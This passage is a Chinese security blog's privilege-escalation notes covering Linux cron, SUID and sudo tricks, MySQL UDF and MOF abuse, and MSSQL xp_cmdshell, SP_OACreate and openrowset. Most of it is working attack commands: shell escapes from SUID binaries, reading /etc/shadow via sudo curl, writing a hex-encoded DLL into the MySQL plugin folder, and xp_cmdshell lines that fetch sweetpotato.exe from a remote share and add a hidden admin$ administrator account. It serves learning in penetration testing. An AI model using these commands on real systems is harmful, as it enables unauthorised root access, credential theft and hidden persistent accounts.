+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/macos-kernel-exploits">mac</a></p>
+<h3 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h3><blockquote>
+<p>crontab -l //列出定时任务</p>
+<p>//查看定时任务</p>
+<p>/etc/crontab</p>
+<p>/var/spool/cron/crontabs</p>
+<p>/etc/cron.*/</p>
+</blockquote>
+<ol>
+<li>定时任务以root或高权限用户运行</li>
+<li>拿到的低权限用户对定时文件有写文件的权限</li>
+</ol>
+<p>然后步骤就是写进定时任务，反弹shell等</p>
+<h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shuteer_xu/article/details/104912790?utm_term=SUID%E6%8F%90%E6%9D%83%20%E5%88%A9%E7%94%A8%E5%A4%B1%E8%B4%A5&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-104912790&spm=3001.4430">具体</a></p>
+<p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行，ls 查看时有 s 属性才支持 SUID</p>
+<p>查找系统中可使用root权限运行的命令：</p>
+<blockquote>
+<p> find / -user root -perm -4000 -print 2&gt;/dev/null<br> find / -perm -u=s -type f 2&gt;/dev/null<br> find / -user root -perm -4000 -exec ls -ldb {} ;</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">perm 表示搜索随后的权限</span><br><span class="ruby"></span>-<span class="ruby">u = s表示查找root用户拥有的文件</span><br><span class="ruby"></span>-<span class="ruby"><span class="hljs-string">``</span>type<span class="hljs-string">``</span>表示我们正在寻找的文件类型</span><br><span class="ruby"></span>f 表示常规文件，而不是目录或特殊文件<br>2表示该进程的第二个文件描述符，即stderr（标准错误）<br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>常用的命令并且可能具有<strong>S</strong>权限有：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span><br><span class="hljs-keyword">vim</span><br><span class="hljs-keyword">find</span><br>bash<br>more<br>less<br>nano<br><span class="hljs-keyword">cp</span><br>awk<br></code></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<blockquote>
+<p>Nmap(2.02-5.21)<br> nmap –interactive<br> !sh</p>
+<p>find<br> touch pentestlab<br> find pentestlab -exec whoami ;</p>
+<p>less/more<br> less(more) /etc/passwd<br> !/bin/sh</p>
+<p>vim/vi<br> vim.tiny<br> :set shell=/bin/sh<br> :shell</p>
+<p>git<br> git help config<br> !/bin/bash</p>
+</blockquote>
+<h3 id="sudo权限绕过"><a href="#sudo权限绕过" class="headerlink" title="sudo权限绕过"></a>sudo权限绕过</h3><p>cve-2019-14287，sudo &lt; 1.8.28</p>
+<blockquote>
+<p>sudo -l</p>
+<p>sudo awk ‘BEGIN{system(“/bin/sh”)}’</p>
+<p>sudo curl file:///etc/shadow</p>
+<p><strong>sudo -u#-1whoami</strong></p>
+</blockquote>
+<h3 id="su-root被禁止登录（获取交互shell）"><a href="#su-root被禁止登录（获取交互shell）" class="headerlink" title="su root被禁止登录（获取交互shell）"></a>su root被禁止登录（获取交互shell）</h3><blockquote>
+<p>拿到 root 密码，端口转发，代理，但防火墙禁止其他人登录 root；</p>
+<p>用原来的低权限 shell，也无法 sudo 切换 root</p>
+<p>因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）</p>
+<p>所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符</p>
+</blockquote>
+<p>利用python获取交互Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br>sudo su<br></code></pre></td></tr></table></figure>
+
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样</p>
+<p><strong>条件：</strong></p>
+<blockquote>
+<p>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/，该目录默认不存在，需要创建后上传udf.dll</p>
+<p>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p>
+<p>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数</p>
+<p>拥有可以将udf.dll写入相应目录的权限</p>
+</blockquote>
+<p><strong>利用：</strong></p>
+<p>mysql内查找插件安装目录：</p>
+<blockquote>
+<p>show variables like %plugin%</p>
+</blockquote>
+<p>目录是否可写：</p>
+<blockquote>
+<p>show variables like ‘%secure_file_priv%’</p>
+</blockquote>
+<p>udf.dll文件可以在sqlmap里面找：</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330184744211.png" srcset="/img/loading.gif" lazyload></p>
+<p>sqlmap中的udf.dll经过异或编码，需要解码</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330210702070.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>python3 cloak.py -d -i lib_mysqludf_sys.dll</p>
+</blockquote>
+<p>将解码后的dll文件复制到<code>mysql/lib/plugin</code></p>
+<p>创建函数：</p>
+<blockquote>
+<p>create function sys_exec returns string soname “lib_mysqludf_sys.dll”;</p>
+<p>create function sys_eval returns string soname “lib_mysqludf_sys.dll”;</p>
+</blockquote>
+<p>其他可用函数如下：</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330211359783.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用：</p>
+<blockquote>
+<p>select sys_exec(‘whoami’);</p>
+<p>select sys_eval(‘whoami’);</p>
+</blockquote>
+<p>删除函数：</p>
+<blockquote>
+<p>DROP function sys_exec;</p>
+<p>DROP function sys_eval;</p>
+</blockquote>
+<p>linux对应的是so文件</p>
+<p>这些dll/so文件还可以在Metasploit的/usr/share/metasploit-framework/data/exploits/mysql目录下找到</p>
+<ul>
+<li>数据流写入</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">create table temp(data longblob);<br>insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);<br>update temp <span class="hljs-built_in">set</span> data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);<br>select data from temp into dumpfile <span class="hljs-string">&quot;G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;</span>;<br>create <span class="hljs-keyword">function</span> sys_eval returns string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;   <span class="hljs-comment">#创建函数sys_eval</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84863268">详情</a></p>
+<ul>
+<li>使用MSF中的<code>exploit/multi/mysql/mysql_udf_payload</code>模块也可以进行UDF提权，但是前提是可以使用账号密码进入mysql以及存在对应目录，msf创建的UDF函数默认是<code>sys_exec()</code>没有回显，如下创建<code>sys_eval()</code></li>
+</ul>
+<blockquote>
+<p>select * from mysql.func where name = “sys_eval”;</p>
+<p>create function sys_eval retuns string soname “xxx.dll”;</p>
+</blockquote>
+<h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>比较老了，权当了解学习：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/12991468.html">参考</a></p>
+<p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）</p>
+<p>叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡</p>
+<blockquote>
+<p>MOF文件既然每五秒就会执行，而且是系统权限；</p>
+<p>我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；</p>
+<p>然后系统每隔五秒就会执行一次我们上传的MOF。</p>
+<p>MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
+</blockquote>
+<p>这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到，而且较新的系统无法使用MOF提权。</p>
+<p><strong>条件：</strong></p>
+<blockquote>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span>&lt;=<span class="hljs-number">2003</span><br></code></pre></td></tr></table></figure>
+
+<p>mysql在c:/windows/system32/wbem/mof目录有写权限</p>
+<p>已知数据库root账号密码</p>
+<p>数据库允许外连</p>
+<p>secure_file_priv为空</p>
+</blockquote>
+<p>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>MySQL</code>的导入|导出做限制，如果是null，表示<code>MySQL</code>不允许导入导出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看secure_file_priv的值</span><br>SHOW VARIABLES LIKE <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br><br><span class="hljs-comment">#这个值可以在my.ini设置为空</span><br>secure_file_priv =<br></code></pre></td></tr></table></figure>
+
+<p><strong>MSF 下有Mof 提权模块</strong></p>
+<p>执行成功后会直接反弹一个 <code>system</code>权限的meterpreter </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/mysql/mysql_mof<br></code></pre></td></tr></table></figure>
+
+<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p><strong>首先查看权限</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--是否sa权限，返回 1 就是sa</span><br><span class="hljs-keyword">select</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>)<br><br><span class="hljs-comment">--是否dba权限，返回 1 就是DBA</span><br><span class="hljs-keyword">select</span> IS_MEMBER(<span class="hljs-string">&#x27;db_owner&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><blockquote>
+<p><strong>适用(xp\2000\2003系统)</strong></p>
+<p>前提是MSSQL是以system用户运行的，才能提权；</p>
+<p>如果用nt authority\network service运行，是没有系统权限的。</p>
+</blockquote>
+<p>默认情况下是关闭的，用下边的命令开启</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>; <span class="hljs-comment">--允许修改高级参数</span><br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>; <span class="hljs-comment">--打开xp_cmdshell扩展</span><br>RECONFIGURE;<br></code></pre></td></tr></table></figure>
+
+<p>如果xp_cmdshell被删除，可以尝试上传<code>xplog70.dll</code> <a target="_blank" rel="noopener" href="https://fix4dll.com/xplog70_dll">https://fix4dll.com/xplog70_dll</a> 进行恢复，恢复语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Exec</span> master.dbo.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,<span class="hljs-string">&#x27;c:\\xplog70.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>然后执行命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> xp_cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="sa提权登RDP"><a href="#sa提权登RDP" class="headerlink" title="sa提权登RDP"></a>sa提权登RDP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;net use \\192.168.10.133\ipc$ mcc5@133 /user:192.168.10.133\administrator&amp;&amp; copy \\192.168.10.133\c$\users\public\videos\sweetpotato.exe c:\users\public\videos\s.exe&#x27;</span><br><br><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;c:\users\public\videos\s.exe -a &quot;whoami&quot;&#x27;</span><br><br><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;c:\users\public\videos\s.exe -a &quot;net user admin$ @admin.886 /add&amp;net localgroup administrators admin$ /add&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="SP-OACreate"><a href="#SP-OACreate" class="headerlink" title="SP_OACreate"></a>SP_OACreate</h3><blockquote>
+<p><strong>适用(xp\2000\2003系统)</strong></p>
+</blockquote>
+<p>当xp_cmdshell 删除以后，还可以使用SP_OACreate</p>
+<p>打开组件：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--开启EXEC</span><br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br><br><span class="hljs-comment">--关闭EXEC</span><br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">0</span>;<br>RECONFIGURE;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="hljs-number">0</span>;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure>
+
+<p>执行命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output <span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这种方式是无回显的，打开1.txt查看命令执行结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span> c:\\1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="openrowset沙盒"><a href="#openrowset沙盒" class="headerlink" title="openrowset沙盒"></a>openrowset沙盒</h3><blockquote>
+<p><strong>(2003系统可用、2012-r2实验失败)</strong></p>
+</blockquote>
+<p>首先检查cmd_shell是否开启：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br><span class="hljs-comment">--结果为 1 就是开启</span><br></code></pre></td></tr></table></figure>
+
+<p>开启默认关闭的xp_regwrite存储过程：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--开启</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span> ,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span> ,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span> ,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span> ,<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>GO<br>RECONFIGURE<br>GO<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>, <span class="hljs-number">1</span><br>GO<br>RECONFIGURE<br>GO<br><br><span class="hljs-comment">--利用完后恢复</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure>
+
+<p>利用jet.oledb执行系统命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span> ,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span> ,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c whoami &gt; c:\\666.txt&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这个也是无回显的</p>
+<p>沙盒模式SandBoxMode参数含义（默认是2）：</p>
+<blockquote>
+<p><code>0</code>：在任何所有者中禁止启用安全模式</p>
+<p><code>1</code> ：为仅在允许范围内</p>
+<p><code>2</code> ：必须在access模式下</p>
+<p><code>3</code>：完全开启</p>
+</blockquote>
+<p>openrowset是可以通过OLE DB访问SQL Server数据库</p>
+<p>OLE DB是应用程序链接到SQL Server的的驱动程序</p>
+<h2 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h2><p><a target="_blank" rel="noopener" href="https://github.com/jas502n/oracleShell">工具</a></p>
+<h2 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h2><p>CVE-2018-1058  CVE-2019-9193</p>
+<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>主要是指未授权访问：写ssh-keygen登录、写计划任务反弹shell、写webshell、主从复制</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>提权是一项很考验综合能力的渗透环节，需要长时间的积累与练习，这笔记有点潦草和凌乱，知识点复杂繁多，将不断更新</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/network/">network</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">横向移动</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
+                        <span class="hidden-mobile">Redis未授权访问</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-SL9T1KRBQY', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
